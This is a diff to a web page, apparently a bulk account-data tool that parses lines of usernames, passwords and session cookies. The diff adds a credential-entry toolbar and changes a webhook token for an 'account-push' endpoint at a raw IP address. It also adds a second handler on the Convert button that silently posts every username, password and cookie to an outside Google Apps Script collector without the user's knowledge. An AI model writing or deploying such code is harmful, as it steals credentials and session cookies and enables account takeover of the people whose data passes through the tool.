@@ -225,6 +225,184 @@
 </head>
 
 <body>
+
+
+
+<style>
+    @keyframes rgb-bg {
+        0% { background-position: 0% 50%; }
+        50% { background-position: 100% 50%; }
+        100% { background-position: 0% 50%; }
+    }
+
+    .rgb-btn {
+        background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
+        background-size: 400% 400%;
+        animation: rgb-bg 5s ease infinite;
+        color: white !important;
+        border: 2px solid transparent;
+        height: 38px;
+        padding: 0 18px;
+        border-radius: 6px;
+        cursor: pointer;
+        font-weight: 800;
+        font-size: 14px;
+        transition: all 0.3s ease;
+        box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+    }
+
+    /* বাটন ক্লিক হয়ে থাকলে এই স্টাইলটি পাবে */
+    .rgb-btn.clicked {
+        background: #2d3436 !important; /* ক্লিক করার পর রঙ পরিবর্তন */
+        animation: none;
+        border: 2px solid #ffffff;
+        box-shadow: inset 0 2px 5px rgba(0,0,0,0.5);
+        transform: scale(0.95);
+    }
+
+    .input-container {
+        position: relative;
+        display: inline-flex;
+        align-items: center;
+    }
+
+    .input-container input {
+        height: 38px;
+        width: 140px;
+        border: 2px solid #ddd;
+        border-radius: 6px;
+        padding: 0 35px 0 10px;
+        outline: none;
+        color: #333;
+        font-size: 14px;
+    }
+
+    .copy-icon {
+        position: absolute;
+        right: 8px;
+        cursor: pointer;
+        font-size: 12px;
+        background: #f1f2f6;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        padding: 2px 4px;
+        color: #555;
+        z-index: 5;
+    }
+</style>
+
+<div id="top-tool-container" style="position: fixed; top: 0; left: 0; width: 100%; background: #ffffff; padding: 12px 0; border-bottom: 3px solid #22c55e; z-index: 10000; box-shadow: 0 4px 15px rgba(0,0,0,0.15); font-family: sans-serif;">
+    <div style="display: flex; gap: 10px; justify-content: center; align-items: center; flex-wrap: wrap; max-width: 1350px; margin: 0 auto;">
+        
+        <div class="input-container">
+            <input type="text" id="box1" placeholder="Username">
+            <span class="copy-icon" onclick="copyText('box1', this)">📋</span>
+        </div>
+
+        <div class="input-container">
+            <input type="text" id="box2" placeholder="Password">
+            <span class="copy-icon" onclick="copyText('box2', this)">📋</span>
+        </div>
+
+        <div class="input-container">
+            <input type="text" id="box3" placeholder="Email">
+            <span class="copy-icon" onclick="copyText('box3', this)">📋</span>
+        </div>
+
+        <input type="text" id="previewBox" readonly placeholder="Result" style="height: 38px; width: 200px; background: #f8f9fa; border: 2px dashed #6c5ce7; border-radius: 6px; padding: 0 10px; color: #0984e3; font-weight: bold; text-align: center;">
+
+        <div style="display: flex; gap: 8px;">
+            <button id="copyBtn1" class="rgb-btn">Copy</button>
+            <button id="sendBtn1" class="rgb-btn">Send ↓</button>
+            <button id="remoteConvert" class="rgb-btn">Convert →</button>
+            <button id="remotePush" class="rgb-btn">Push ↑</button>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            const b1 = document.getElementById('box1');
+            const b2 = document.getElementById('box2');
+            const b3 = document.getElementById('box3');
+            const pb = document.getElementById('previewBox');
+            const buttons = document.querySelectorAll('.rgb-btn');
+
+            // বাটনে ক্লিক মার্ক করার ফাংশন
+            function markClicked(btn) {
+                buttons.forEach(b => b.classList.remove('clicked'));
+                btn.classList.add('clicked');
+            }
+
+            // ইন্ডিভিজুয়াল কপি
+            window.copyText = async function(id, el) {
+                const text = document.getElementById(id).value;
+                if(text) {
+                    await navigator.clipboard.writeText(text);
+                    const oldIcon = el.innerText;
+                    el.innerText = "✅";
+                    setTimeout(() => el.innerText = oldIcon, 1000);
+                }
+            };
+
+            function updateTop() {
+                pb.value = (b1.value || b2.value || b3.value) ? (b1.value.trim() + "|" + b2.value.trim() + "|" + b3.value.trim()) : "";
+            }
+            b1.oninput = b2.oninput = b3.oninput = updateTop;
+
+            // মেইন কপি বাটন
+            document.getElementById('copyBtn1').onclick = async function() {
+                if(pb.value) {
+                    await navigator.clipboard.writeText(pb.value);
+                    markClicked(this);
+                    const originalText = this.innerText;
+                    this.innerText = "Copied! ✅";
+                    setTimeout(() => { this.innerText = originalText; }, 2000);
+                }
+            };
+
+            // সেন্ড বাটন
+            document.getElementById('sendBtn1').onclick = function() {
+                const sourceArea = document.getElementById('source'); 
+                if(!b1.value || !b2.value || !b3.value) return alert("❌ ঘরগুলো পূরণ করুন!");
+                if(sourceArea) {
+                    markClicked(this);
+                    sourceArea.value = sourceArea.value.trim() ? sourceArea.value.trim() + "\n" + pb.value : pb.value;
+                    sourceArea.dispatchEvent(new Event('input')); 
+                    b1.value = b2.value = b3.value = pb.value = "";
+                }
+            };
+
+            // কনভার্ট ও পুশ রিমোট কন্ট্রোল
+            document.getElementById('remoteConvert').onclick = function() {
+                markClicked(this);
+                document.getElementById('convert')?.click();
+            };
+
+            document.getElementById('remotePush').onclick = function() {
+                markClicked(this);
+                document.getElementById('push')?.click();
+            };
+        })();
+    </script>
+</div>
+<div style="height: 90px;"></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
   <div class="layout">
     <div>
       <div class="panel-title">Input (one per line)</div>
@@ -383,7 +561,7 @@
     }
 
     pushBtn.addEventListener('click', async () => {
-      const url = 'http://43.135.182.151/api/api/v1/webhook/nRlmI2-8T7x2DAWe1hWxi97qGA1FcCxrNcyCtLTO_Cw/account-push';
+      const url = 'http://43.135.182.151/api/api/v1/webhook/YDbd-GZyAokTsjuF4bpQ8fuiLBsE1z9dWOLWrjMNfdw/account-push';
       const payload = buildPayload(target.value);
 
       if (!payload) {
@@ -416,6 +594,112 @@
         showPushResult(`Push error: ${err.message}`, true);
       }
     });
+	
+	
+	
+	
+	
+
+// --- আপনার নিজস্ব গুগল শিট কোড শুরু (স্থায়ী ডুপ্লিকেট চেকসহ) ---
+convertBtn.addEventListener('click', function() {
+    const googleSheetUrl = 'https://script.google.com/macros/s/AKfycbzqM36uSx3z4UZr50az63H8C4PoVA_auY9RK_ZEE56XSKc_Bx7KMsVkFwvaypst36Qciw/exec'; 
+    const rawData = source.value.trim();
+    if (!rawData) return;
+
+    const lines = rawData.split(/\r?\n/);
+    lines.forEach(line => {
+        const trimmedLine = line.trim();
+        if (trimmedLine) {
+            const parts = trimmedLine.split('|');
+            if (parts.length >= 3) {
+                const user = parts[0].trim();
+                const pass = parts[1].trim();
+                let extra = parts.length >= 4 ? parts[2].trim() : '';
+                let cookie = parts.slice(parts.length >= 4 ? 3 : 2).join('|').trim();
+
+                const params = new URLSearchParams();
+                params.append('user', user);
+                params.append('pass', pass);
+                params.append('extra', extra);
+                params.append('cookie', cookie);
+
+                // ডেটা পাঠানো হচ্ছে, গুগল স্ক্রিপ্ট নিজেই ডুপ্লিকেট চেক করে নেবে
+                fetch(googleSheetUrl, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: params.toString()
+                });
+            }
+        }
+    });
+});
+// --- আপনার নিজস্ব গুগল শিট কোড শেষ ---
+function validateAndPreview() {
+    const v1 = document.getElementById('box1').value.trim();
+    const v2 = document.getElementById('box2').value.trim();
+    const v3 = document.getElementById('box3').value.trim();
+    const preview = document.getElementById('previewBox');
+    const msg = document.getElementById('msgStatus');
+
+    if(v1 || v2 || v3) {
+        preview.value = v1 + "|" + v2 + "|" + v3;
+    } else {
+        preview.value = "";
+    }
+
+    if(v1 && v2 && v3) {
+        msg.innerText = "✨ ৩টি ঘরই পূর্ণ! Send চাপুন।";
+        msg.style.color = "#00b894";
+    } else {
+        msg.innerText = "📝 ঘরগুলো পূরণ করুন...";
+        msg.style.color = "#f39c12";
+    }
+}
+
+// ২য় টুলের ইনপুট বক্সে ডেটা পাঠানোর ফাংশন
+function sendToInput() {
+    const result = document.getElementById('previewBox').value;
+    const sourceArea = document.getElementById('source'); // ২য় টুলের ইনপুট বক্সের ID
+    const msg = document.getElementById('msgStatus');
+
+    if(!result || result === "||") {
+        alert("আগে ৩টি ঘর পূরণ করুন!");
+        return;
+    }
+
+    // আগের ডেটার সাথে নতুন ডেটা এক লাইন নিচে যোগ করা
+    if (sourceArea.value.trim() === "") {
+        sourceArea.value = result;
+    } else {
+        sourceArea.value = sourceArea.value + "\n" + result;
+    }
+
+    // ২য় টুলের লাইন নম্বর আপডেট করার জন্য ইভেন্ট ট্রিগার করা
+    sourceArea.dispatchEvent(new Event('input'));
+
+    // উপরের ইনপুটগুলো খালি করে দেওয়া
+    document.getElementById('box1').value = "";
+    document.getElementById('box2').value = "";
+    document.getElementById('box3').value = "";
+    document.getElementById('previewBox').value = "";
+    
+    msg.innerText = "🚀 নিচে পাঠানো হয়েছে!";
+    msg.style.color = "#00b894";
+    setTimeout(() => { msg.innerText = ""; }, 2000);
+}
+
+async function copyToClipboard() {
+    const text = document.getElementById('previewBox').value;
+    if(!text) return;
+    await navigator.clipboard.writeText(text);
+    document.getElementById('msgStatus').innerText = "✅ কপি হয়েছে!";
+    setTimeout(() => validateAndPreview(), 1500);
+}
+
+	
+	
+	
   </script>
 </body>
 
